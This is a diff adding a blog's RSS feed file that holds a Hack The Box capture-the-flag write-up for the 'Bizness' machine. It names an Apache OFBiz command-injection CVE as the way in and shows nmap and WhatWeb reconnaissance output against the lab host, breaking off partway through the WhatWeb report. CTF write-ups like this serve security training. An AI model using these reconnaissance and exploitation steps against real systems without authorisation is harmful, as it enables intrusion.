@@ -1,0 +1,524 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Linux on ShaanksFR Blog</title><link>https://shaanksm.github.io/categories/linux/</link><description>Recent content in Linux on ShaanksFR Blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 24 Jan 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://shaanksm.github.io/categories/linux/index.xml" rel="self" type="application/rss+xml"/><item><title>Bizness Writeup</title><link>https://shaanksm.github.io/p/bizness-writeup/</link><pubDate>Wed, 24 Jan 2024 00:00:00 +0000</pubDate><guid>https://shaanksm.github.io/p/bizness-writeup/</guid><description>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/cover.png" alt="Featured image of post Bizness Writeup" />&lt;h1 id="bizness-htb---writeup">BIZNESS HTB - WRITEUP&lt;/h1>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/cover.png"
+width="1123"
+height="403"
+srcset="https://shaanksm.github.io/p/bizness-writeup/cover_huaea1c6500f5f6ef73de368cd5cb02c59_88074_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/cover_huaea1c6500f5f6ef73de368cd5cb02c59_88074_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="introduction"
+class="gallery-image"
+data-flex-grow="278"
+data-flex-basis="668px"
+>&lt;/p>
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;p>&amp;quot; Bizness&amp;quot;, released on January 6, 2024, is a challenging machine on Hack The Box. It highlights a critical CVE in Apache OFBiz, allowing for command injection and potential Remote Code Execution (RCE), along with a pathway for Server-Side Request Forgery (SSRF). The machine extends its complexity by requiring participants to navigate through diverse folders, extract spear information, and employ configuration analysis to crack passwords for privilege escalation. Engaging with &amp;ldquo;Bizness&amp;rdquo; offers a hands-on experience in identifying and exploiting vulnerabilities while emphasizing the importance of effective privilege escalation techniques.&lt;/p>
+&lt;h2 id="matrix">Matrix&lt;/h2>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/matrix.png"
+width="441"
+height="451"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/matrix_hu05d9d93fe7860588f2047608ba5eba39_34031_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/matrix_hu05d9d93fe7860588f2047608ba5eba39_34031_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Matrix&amp;rsquo;s Box"
+class="gallery-image"
+data-flex-grow="97"
+data-flex-basis="234px"
+>&lt;/p>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;p>I kick off the process by enumerating ports using AutoRecon(Tool only for CTF environnemnt).&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># ┌──(shnks㉿shnks)-[~]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ nmap -A -T4 bizness.htb
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-25 00:54 CET
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report for bizness.htb (10.10.11.252)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up (0.018s latency).
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: 997 closed tcp ports (conn-refused)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ 256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http nginx 1.18.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-server-header: nginx/1.18.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-title: Did not follow redirect to https://bizness.htb/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">443/tcp open ssl/http nginx 1.18.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-title: BizNess Incorporated
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| Not valid before: 2023-12-14T20:03:40
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_Not valid after: 2328-11-10T20:03:40
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| tls-alpn:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ http/1.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_http-server-header: nginx/1.18.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ssl-date: TLS randomness does not represent time
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| tls-nextprotoneg:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">|_ http/1.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap done: 1 IP address (1 host up) scanned in 17.80 seconds
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Leveraging this phase, I meticulously list directories and explore the site concurrently with the scan.
+It&amp;rsquo;s during this exploration that I pinpoint the &amp;ldquo;accounting&amp;rdquo; directory, which appears to be the most promising starting point.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc1.png"
+width="958"
+height="763"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc1_hud081570df7d56706cfa1a228282c2700_167820_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/sc1_hud081570df7d56706cfa1a228282c2700_167820_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Dirsearch enumeration"
+class="gallery-image"
+data-flex-grow="125"
+data-flex-basis="301px"
+>&lt;/p>
+&lt;p>Upon closer examination, I stumble upon an authentication page utilizing the Apache OFBiz framework, with a version susceptible to two CVEs. &lt;br>
+The one that catches my eye is &lt;em>&lt;strong>CVE-2023-51467&lt;/strong>&lt;/em>, which I exploit to secure an initial foothold on the server.&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/webofbiz.png"
+width="1911"
+height="693"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/webofbiz_hu81d6967eaaaadf4894a5c1fa5f5b1247_68652_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/webofbiz_hu81d6967eaaaadf4894a5c1fa5f5b1247_68652_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Web page Apache"
+class="gallery-image"
+data-flex-grow="275"
+data-flex-basis="661px"
+>&lt;/p>
+&lt;p>Bellow the result&amp;rsquo;s whatweb&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;span class="lnt">73
+&lt;/span>&lt;span class="lnt">74
+&lt;/span>&lt;span class="lnt">75
+&lt;/span>&lt;span class="lnt">76
+&lt;/span>&lt;span class="lnt">77
+&lt;/span>&lt;span class="lnt">78
+&lt;/span>&lt;span class="lnt">79
+&lt;/span>&lt;span class="lnt">80
+&lt;/span>&lt;span class="lnt">81
+&lt;/span>&lt;span class="lnt">82
+&lt;/span>&lt;span class="lnt">83
+&lt;/span>&lt;span class="lnt">84
+&lt;/span>&lt;span class="lnt">85
+&lt;/span>&lt;span class="lnt">86
+&lt;/span>&lt;span class="lnt">87
+&lt;/span>&lt;span class="lnt">88
+&lt;/span>&lt;span class="lnt">89
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">WhatWeb&lt;/span> &lt;span class="n">report&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">bizness&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">htb&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">443&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Status&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="mi">200&lt;/span> &lt;span class="n">OK&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Title&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">BizNess&lt;/span> &lt;span class="n">Incorporated&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="ne">IP&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="mf">10.10&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">11.252&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Country&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">RESERVED&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ZZ&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Summary&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">Bootstrap&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Cookies&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">JSESSIONID&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">Email&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">bizness&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">htb&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">HTML5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">HTTPServer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">nginx&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.18&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">HttpOnly&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">JSESSIONID&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">JQuery&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">Lightbox&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">nginx&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mf">1.18&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="ne">Script&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Detected&lt;/span> &lt;span class="n">Plugins&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">Bootstrap&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Bootstrap&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="n">an&lt;/span> &lt;span class="n">open&lt;/span> &lt;span class="n">source&lt;/span> &lt;span class="n">toolkit&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">developing&lt;/span> &lt;span class="n">with&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HTML&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">CSS&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">JS&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Website&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">getbootstrap&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">Cookies&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Display&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">names&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">cookies&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">HTTP&lt;/span> &lt;span class="n">headers&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">The&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">values&lt;/span> &lt;span class="n">are&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">returned&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">save&lt;/span> &lt;span class="n">on&lt;/span> &lt;span class="n">space&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="ne">String&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">JSESSIONID&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">Email&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">Extract&lt;/span> &lt;span class="n">email&lt;/span> &lt;span class="n">addresses&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">Find&lt;/span> &lt;span class="n">valid&lt;/span> &lt;span class="n">email&lt;/span> &lt;span class="n">address&lt;/span> &lt;span class="ow">and&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">syntactically&lt;/span> &lt;span class="n">invalid&lt;/span> &lt;span class="n">email&lt;/span> &lt;span class="n">addresses&lt;/span> &lt;span class="n">from&lt;/span> &lt;span class="n">mailto&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">link&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">tags&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">We&lt;/span> &lt;span class="n">match&lt;/span> &lt;span class="n">syntactically&lt;/span> &lt;span class="n">invalid&lt;/span> &lt;span class="n">links&lt;/span> &lt;span class="n">containing&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mailto&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">catch&lt;/span> &lt;span class="n">anti&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">spam&lt;/span> &lt;span class="n">email&lt;/span> &lt;span class="n">addresses&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">eg&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">bob&lt;/span> &lt;span class="n">at&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">gmail&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">This&lt;/span> &lt;span class="n">uses&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">simplified&lt;/span> &lt;span class="n">email&lt;/span> &lt;span class="n">regular&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">expression&lt;/span> &lt;span class="n">from&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">regular&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">expressions&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">email&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">html&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">valid&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">email&lt;/span> &lt;span class="n">address&lt;/span> &lt;span class="n">matching&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="ne">String&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">bizness&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="ne">String&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">bizness&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">htb&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">HTML5&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HTML&lt;/span> &lt;span class="n">version&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">detected&lt;/span> &lt;span class="n">by&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">doctype&lt;/span> &lt;span class="n">declaration&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">HTTPServer&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HTTP&lt;/span> &lt;span class="n">server&lt;/span> &lt;span class="n">header&lt;/span> &lt;span class="n">string&lt;/span>&lt;span class="o">.&lt;/span> &lt;span class="n">This&lt;/span> &lt;span class="n">plugin&lt;/span> &lt;span class="n">also&lt;/span> &lt;span class="n">attempts&lt;/span> &lt;span class="n">to&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">identify&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">operating&lt;/span> &lt;span class="n">system&lt;/span> &lt;span class="n">from&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">server&lt;/span> &lt;span class="n">header&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="ne">String&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">nginx&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mf">1.18&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mi">0&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">from&lt;/span> &lt;span class="n">server&lt;/span> &lt;span class="n">string&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">HttpOnly&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">If&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">HttpOnly&lt;/span> &lt;span class="n">flag&lt;/span> &lt;span class="n">is&lt;/span> &lt;span class="n">included&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">HTTP&lt;/span> &lt;span class="n">set&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">cookie&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">response&lt;/span> &lt;span class="n">header&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">browser&lt;/span> &lt;span class="n">supports&lt;/span> &lt;span class="n">it&lt;/span> &lt;span class="n">then&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">cookie&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cannot&lt;/span> &lt;span class="n">be&lt;/span> &lt;span class="n">accessed&lt;/span> &lt;span class="n">through&lt;/span> &lt;span class="n">client&lt;/span> &lt;span class="n">side&lt;/span> &lt;span class="n">script&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">More&lt;/span> &lt;span class="n">Info&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">en&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">wikipedia&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">org&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">wiki&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">HTTP_cookie&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="ne">String&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">JSESSIONID&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span> &lt;span class="n">JQuery&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">A&lt;/span> &lt;span class="n">fast&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">concise&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">JavaScript&lt;/span> &lt;span class="n">that&lt;/span> &lt;span class="n">simplifies&lt;/span> &lt;span class="n">how&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">traverse&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">HTML&lt;/span> &lt;span class="n">documents&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">handle&lt;/span> &lt;span class="n">events&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">perform&lt;/span> &lt;span class="n">animations&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="ow">and&lt;/span> &lt;span class="n">add&lt;/span>
